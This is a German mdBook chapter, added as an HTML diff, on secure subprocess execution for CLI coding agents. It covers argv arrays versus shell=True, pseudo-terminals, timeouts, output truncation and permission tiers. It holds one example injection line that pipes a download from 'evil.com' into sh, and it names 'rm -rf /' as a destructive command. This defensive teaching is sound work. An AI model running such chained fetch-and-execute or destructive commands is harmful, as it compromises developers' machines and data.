@@ -1,0 +1,337 @@
+<!DOCTYPE HTML>
+<html lang="de" class="light sidebar-visible" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>Subprozess-Steuerung, PTYs und Shell-Sicherheit - Digitale Dokumentation und Wissenssysteme</title>
+
+
+        <!-- Custom HTML head -->
+
+        <meta name="description" content="Grundlagen und Evolution von Dokumentation, Wissenssystemen, CMS und Docs-as-Code">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="../favicon.svg">
+        <link rel="shortcut icon" href="../favicon.png">
+        <link rel="stylesheet" href="../css/variables.css">
+        <link rel="stylesheet" href="../css/general.css">
+        <link rel="stylesheet" href="../css/chrome.css">
+        <link rel="stylesheet" href="../css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../highlight.css">
+        <link rel="stylesheet" href="../tomorrow-night.css">
+        <link rel="stylesheet" href="../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+        <style>
+            .ai-transparency-notice {
+                margin: 1.5em 0;
+            }
+            .ai-transparency-notice blockquote {
+                margin: 0;
+                padding: 0.75em 1.25em;
+                font-size: 0.88em;
+                line-height: 1.5;
+                color: var(--fg);
+                background-color: var(--quote-bg);
+                border-left: 4px solid var(--quote-border);
+                border-block-start: none;
+                border-radius: 4px;
+            }
+            .ai-transparency-notice blockquote p {
+                margin: 0;
+            }
+        </style>
+
+
+        <!-- Provide site root to javascript -->
+        <script>
+            var path_to_root = "../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+        <!-- Start loading toc.js asap -->
+        <script src="../toc.js"></script>
+    </head>
+    <body>
+    <div id="body-container">
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            const html = document.documentElement;
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add("js");
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            var sidebar = null;
+            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <!-- populated by js -->
+            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
+            <noscript>
+                <iframe class="sidebar-iframe-outer" src="../toc.html"></iframe>
+            </noscript>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">Digitale Dokumentation und Wissenssysteme</h1>
+
+                    <div class="right-buttons">
+                        <a href="../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <div class="ai-transparency-notice ai-header-notice">
+                            <blockquote>
+                                <p><em>Diese Inhalte wurden mit Unterstützung von Künstlicher Intelligenz erstellt und redaktionell überprüft (Transparenzhinweis gemäß Art. 50 EU AI Act).</em></p>
+                            </blockquote>
+                        </div>
+                        <h1 id="subprozess-steuerung-ptys-und-shell-sicherheit"><a class="header" href="#subprozess-steuerung-ptys-und-shell-sicherheit">Subprozess-Steuerung, PTYs und Shell-Sicherheit</a></h1>
+<p>Ein CLI-Coding-Agent entfaltet seine Stärke erst dadurch, dass er nicht nur passiv Text generiert, sondern aktiv auf dem Betriebssystem agiert: Er führt Tests aus (<code>pytest</code>, <code>cargo test</code>), ruft Versionskontrollbefehle auf (<code>git status</code>, <code>git diff</code>), startet Compiler und analysiert Fehlermeldungen.</p>
+<p>Diese direkte Interaktion mit der Shell birgt jedoch gravierende Risiken: Sprachmodelle sind anfällig für Prompt Injections, können fatale Kommandos generieren (wie <code>rm -rf /</code> oder das Überschreiben sensibler Konfigurationsdateien) oder in unendlichen Prozess-Schleifen hängen bleiben. Eine professionelle CLI-Integration erfordert daher eine strikte Trennung von Shell-Befehlen, den Einsatz von Pseudo-Terminals (PTYs) sowie mehrstufige Sicherheits-Schleusen.</p>
+<hr />
+<h2 id="architektur-der-sicheren-prozess-ausführung"><a class="header" href="#architektur-der-sicheren-prozess-ausführung">Architektur der sicheren Prozess-Ausführung</a></h2>
+<p>Um den Entwicklerrechner zu schützen und gleichzeitig aussagekräftige Rückmeldungen an das Sprachmodell zurückzuspeisen, durchläuft jeder Werkzeug-Aufruf eine definierte Sicherheits- und Ausführungsarchitektur:</p>
+<pre><code>┌────────────────────────────────────────────────────────────────────────┐
+│ Sicherheitsarchitektur für Subprozesse                                 │
+│                                                                        │
+│   ┌────────────────────────────────────────────────────────────┐       │
+│   │ KI-Modell / Framework-SDK: Tool-Call Vorschlag             │       │
+│   │ `{"tool": "bash", "command": "npm test"}`                  │       │
+│   └─────────────────────────────┬──────────────────────────────┘       │
+│                                 │                                      │
+│                                 ▼                                      │
+│   ┌────────────────────────────────────────────────────────────┐       │
+│   │ Sicherheits-Filter &amp; Policy-Engine                         │       │
+│   │  ├─ Befehls-Klassifikation: Read-Only vs. Mutation        │       │
+│   │  ├─ Denylist: Blockierung destruktiver Befehle (`rm -rf`)  │       │
+│   │  └─ Human-in-the-Loop: Interaktive Freigabe durch Nutzer   │       │
+│   └─────────────────────────────┬──────────────────────────────┘       │
+│                                 │ (Bestätigt)                          │
+│                                 ▼                                      │
+│   ┌────────────────────────────────────────────────────────────┐       │
+│   │ Prozess-Manager &amp; PTY-Laufzeit                             │       │
+│   │  ├─ Argument-Vektorisierung (`argv`-Array, kein Shell-Eval)│       │
+│   │  ├─ Pseudo-Terminal (PTY): Erhalt von ANSI-Farben &amp; TTY    │       │
+│   │  ├─ Timeout-Wächter (z. B. 30s) mit SIGTERM / SIGKILL     │       │
+│   │  └─ Output-Kappung (Truncation, z. B. max. 50 KB Puffer)   │       │
+│   └─────────────────────────────┬──────────────────────────────┘       │
+│                                 │                                      │
+│                                 ▼                                      │
+│   ┌────────────────────────────────────────────────────────────┐       │
+│   │ Bereinigtes Ergebnis an KI-Kontext                         │       │
+│   │ Exit-Code, formatierte Fehlerausgabe, bereinigter Text     │       │
+│   └────────────────────────────────────────────────────────────┘       │
+└────────────────────────────────────────────────────────────────────────┘
+</code></pre>
+<hr />
+<h2 id="vermeidung-von-shell-injections-argv-vs-shelltrue"><a class="header" href="#vermeidung-von-shell-injections-argv-vs-shelltrue">Vermeidung von Shell-Injections: <code>argv</code> vs. <code>shell=True</code></a></h2>
+<p>Der verhängnisvollste Fehler bei der Entwicklung von CLI-Agenten ist die Übergabe von Befehlsstrings an eine auswertende Shell-Instanz (z. B. <code>subprocess.run(command, shell=True)</code> in Python oder <code>child_process.exec(command)</code> in Node.js).</p>
+<p>Wenn ein Modell oder ein durch Prompt Injection manipulierter Dateiinhalt ein Semikolon, Pipes oder Subshell-Operatoren einbettet (z. B. <code>cat datei.txt; curl evil.com/exfiltrate | sh</code>), führt das Betriebssystem beide Befehle ungeprüft aus.</p>
+<h3 id="best-practice-strukturierte-argument-vektoren"><a class="header" href="#best-practice-strukturierte-argument-vektoren">Best Practice: Strukturierte Argument-Vektoren</a></h3>
+<p>Kommandos dürfen niemals als unstrukturierter String an eine Shell übergeben werden. Stattdessen sind strikt typisierte Argument-Arrays zu verwenden:</p>
+<pre><code class="language-python"># ❌ GEFÄHRLICH: Anfällig für Shell-Injections und Command-Chaining
+subprocess.run(f"git checkout {branch_name}", shell=True)
+
+#  SICHER: Das Betriebssystem ruft das Binary direkt ohne Shell-Parsing auf
+subprocess.run(["git", "checkout", branch_name], shell=False)
+</code></pre>
+<p>Muss dem Modell dennoch eine flexible Shell zur Verfügung gestellt werden, muss der Befehlsstring vorab durch einen sicheren Parser (z. B. <code>shlex.split()</code> in Python oder entsprechende POSIX-Shell-Lexer) validiert und in ein Argument-Array zerlegt werden.</p>
+<hr />
+<h2 id="pseudo-terminals-pty-farbausgaben-und-interaktive-programme"><a class="header" href="#pseudo-terminals-pty-farbausgaben-und-interaktive-programme">Pseudo-Terminals (PTY): Farbausgaben und interaktive Programme</a></h2>
+<p>Führt ein Agent Subprozesse über Standard-Pipes (<code>pipe()</code>) aus, erkennen viele Compiler, Test-Frameworks und CLI-Tools (wie <code>git diff</code>, <code>pytest</code> oder <code>clang</code>), dass kein TTY vorhanden ist. In der Folge deaktivieren sie Syntax-Hervorhebungen oder brechen ab, weil sie eine interaktive Terminal-Umgebung erwarten.</p>
+<h3 id="warum-pseudo-terminals-ptys"><a class="header" href="#warum-pseudo-terminals-ptys">Warum Pseudo-Terminals (PTYs)?</a></h3>
+<p>Ein <strong>Pseudo-Terminal (PTY)</strong> stellt ein Master-Slave-Paar bereit, das dem aufgerufenen Kindprozess ein echtes Hardware-Terminal vortäuscht:</p>
+<ol>
+<li><strong>Erhalt von Farben und Formatierungen:</strong> Werkzeuge geben ihre Fehlermeldungen und Diffs mit vollständigen ANSI-Farbcodes aus, was die Lesbarkeit für den menschlichen Entwickler drastisch erhöht.</li>
+<li><strong>Interaktive CLI-Tools:</strong> Programme, die auf Cursortasten oder Passworteingaben warten, können vom Agenten über das PTY gesteuert werden.</li>
+<li><strong>Bibliotheken:</strong>
+<ul>
+<li><strong>Rust:</strong> <code>portable-pty</code></li>
+<li><strong>Go:</strong> <code>github.com/creack/pty</code></li>
+<li><strong>Node.js:</strong> <code>node-pty</code></li>
+<li><strong>Python:</strong> <code>ptyprocess</code> / <code>pty</code></li>
+</ul>
+</li>
+</ol>
+<hr />
+<h2 id="laufzeit-schutzmaßnahmen-und-ressourcen-limits"><a class="header" href="#laufzeit-schutzmaßnahmen-und-ressourcen-limits">Laufzeit-Schutzmaßnahmen und Ressourcen-Limits</a></h2>
+<p>Da vom Modell aufgerufene Befehle fehlerhaft sein oder in Endlosschleifen geraten können (z. B. ein fehlerhafter Unit-Test oder ein blockierender Web-Server), muss der Subprozess-Manager harte Guardrails durchsetzen:</p>
+<h3 id="1-timeout-Überwachung-und-prozessbaum-terminierung"><a class="header" href="#1-timeout-Überwachung-und-prozessbaum-terminierung">1. Timeout-Überwachung und Prozessbaum-Terminierung</a></h3>
+<p>Jeder Subprozess muss mit einem expliziten Timeout versehen werden (z. B. 30 Sekunden für Standard-Befehle, erweiterbar für Builds). Läuft der Timer ab, genügt ein einfaches <code>kill(pid)</code> meist nicht, da Kindprozesse (z. B. vom Build-Tool gestartete Subprozesse) als Waisen im System verbleiben.</p>
+<ul>
+<li><strong>Prozessgruppen:</strong> Der Befehl muss in einer eigenen Prozessgruppe (<code>setpgid</code>) gestartet werden.</li>
+<li><strong>Kaskadiertes Beenden:</strong> Nach Ablauf des Timeouts wird zunächst <code>SIGTERM</code> an die gesamte Prozessgruppe gesendet (<code>killpg</code>). Reagiert der Prozess nach kurzer Karenzzeit (z. B. 2 Sekunden) nicht, folgt das unweigerliche <code>SIGKILL</code>.</li>
+</ul>
+<h3 id="2-output-kappung-buffer-truncation"><a class="header" href="#2-output-kappung-buffer-truncation">2. Output-Kappung (Buffer Truncation)</a></h3>
+<p>Gibt ein Befehl versehentlich Millionen von Zeilen aus (z. B. <code>cat /dev/urandom</code> oder ein rekursives Listing riesiger Ordner), darf der Arbeitsspeicher des CLI-Agenten nicht überlaufen.</p>
+<ul>
+<li>Der Ausgabepuffer wird auf eine Maximalgröße begrenzt (z. B. 50 KB oder 2.000 Zeilen).</li>
+<li>Bei Überschreitung wird der Stream abgeschnitten und mit einem eindeutigen Hinweis für das Modell versehen:<br />
+<code>[Warnung: Ausgabe nach 50 KB abgeschnitten. Bitte die Abfrage präzisieren.]</code></li>
+</ul>
+<hr />
+<h2 id="berechtigungsstufen-und-human-in-the-loop"><a class="header" href="#berechtigungsstufen-und-human-in-the-loop">Berechtigungsstufen und Human-in-the-Loop</a></h2>
+<p>Ein ausgereifter CLI-Agent implementiert ein mehrstufiges Berechtigungsmodell für Werkzeugaufrufe:</p>
+<div class="table-wrapper"><table><thead><tr><th style="text-align: left">Stufe</th><th style="text-align: left">Kategorie</th><th style="text-align: left">Typische Befehle</th><th style="text-align: left">Freigabemodus</th></tr></thead><tbody>
+<tr><td style="text-align: left"><strong>0: Read-Only</strong></td><td style="text-align: left">Inspektion</td><td style="text-align: left"><code>git status</code>, <code>ls</code>, <code>grep</code>, <code>cat</code></td><td style="text-align: left">Vollautomatisch (Silent)</td></tr>
+<tr><td style="text-align: left"><strong>1: Verifikation</strong></td><td style="text-align: left">Tests &amp; Builds</td><td style="text-align: left"><code>npm test</code>, <code>pytest</code>, <code>cargo check</code></td><td style="text-align: left">Automatisch oder einmalige Session-Freigabe</td></tr>
+<tr><td style="text-align: left"><strong>2: Mutation</strong></td><td style="text-align: left">Dateisystem-Änderungen</td><td style="text-align: left">Code-Editierung, <code>npm install</code>, <code>rm test.tmp</code></td><td style="text-align: left">Interaktive Bestätigung (<code>[y/n]</code>)</td></tr>
+<tr><td style="text-align: left"><strong>3: Kritisch</strong></td><td style="text-align: left">System &amp; Remote</td><td style="text-align: left"><code>git push</code>, Shell-Scripts, <code>sudo</code>, <code>docker run</code></td><td style="text-align: left">Explizite Bestätigung mit Diff-Ansicht</td></tr>
+</tbody></table>
+</div>
+<hr />
+<h2 id="querverweise-und-vertiefung"><a class="header" href="#querverweise-und-vertiefung">Querverweise und Vertiefung</a></h2>
+<ul>
+<li>Für die Integration in Unix-Pipelines und die Trennung von <code>stdout</code> und <code>stderr</code> siehe <a href="unix-pipes-headless.html">Unix-Pipes, Headless-Betrieb und Standard-Streams</a>.</li>
+<li>Details zur interaktiven Darstellung von Bestätigungsdialogen und Tastatur-Handling bietet <a href="tui-repl-terminal-streaming.html">TUI-Schnittstellen, REPL-Loops und Token-Streaming</a>.</li>
+<li>Weitere Aspekte zur Kapselung von Coding-Agenten in Docker- und OS-Sandboxes beschreibt das Kapitel <a href="../ide-ki-integration/terminal-agenten-sandboxing.html">Terminal-Agenten und Sandboxing</a>.</li>
+</ul>
+
+                        <div class="ai-transparency-notice ai-footer-notice">
+                            <blockquote>
+                                <p><em>Diese Inhalte wurden mit Unterstützung von Künstlicher Intelligenz erstellt und redaktionell überprüft (Transparenzhinweis gemäß Art. 50 EU AI Act).</em></p>
+                            </blockquote>
+                        </div>
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../cli-agenten-ki-integration/tui-repl-terminal-streaming.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="../Impressum.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../cli-agenten-ki-integration/tui-repl-terminal-streaming.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="../Impressum.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="../elasticlunr.min.js"></script>
+        <script src="../mark.min.js"></script>
+        <script src="../searcher.js"></script>
+
+        <script src="../clipboard.min.js"></script>
+        <script src="../highlight.js"></script>
+        <script src="../book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+
+    </div>
+    </body>
+</html>
